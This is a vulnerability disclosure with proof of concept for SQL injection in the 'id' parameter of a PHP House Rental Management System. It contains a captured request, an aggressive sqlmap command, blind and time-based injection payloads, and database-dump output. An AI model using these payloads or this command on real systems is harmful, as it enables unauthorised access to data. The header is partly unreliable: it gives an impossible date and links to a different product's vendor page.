# House Rental Management System - SQL Injection - 2
+ **Exploit Title:** House Rental Management System - SQL Injection - 2
+ **Date:** 2024-15-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** Latest
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
House Rental Management System allows SQL Injection via the 'id' parameter at "http://localhost/rental/view_payment.php?id=12". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/rental/index.php?page=tenants"
+ Click view button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /rental/view_payment.php?id=12 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=12 AND 5328=5328

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=12 AND (SELECT 7871 FROM (SELECT(SLEEP(5)))Ovop)
---
[17:10:43] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:10:43] [INFO] fetching current database             
current database: 'house_rental_latest'
```
+ current database: `house_rental_latest`

![Ekran görüntüsü 2024-05-16 002239](https://github.com/BurakSevben/CVEs/assets/117217689/f25e73fd-750d-400c-a83f-4e042416fa48)
